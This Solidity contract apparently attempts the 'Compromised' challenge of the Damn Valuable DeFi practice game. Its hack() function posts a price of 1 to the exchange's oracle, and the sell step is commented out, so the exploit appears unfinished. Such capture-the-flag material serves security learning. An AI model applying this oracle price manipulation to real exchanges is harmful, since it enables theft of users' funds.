// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Exchange } from "./Exchange.sol";
import { TrustfulOracle } from "./TrustfulOracle.sol";
import { TrustfulOracleInitializer } from "./TrustfulOracleInitializer.sol";
import "../DamnValuableNFT.sol";


contract HackCompromised {
    Exchange exchange;
    TrustfulOracle oracle;
    DamnValuableNFT token;

    constructor(Exchange _exchange, TrustfulOracle _oracle, DamnValuableNFT _token) {
        exchange = _exchange;
        oracle = _oracle;
        token = _token;
    }

    function hack() public payable {
        oracle.postPrice(token.symbol(), 1);
        //exchange.sellOne(1);
    }

}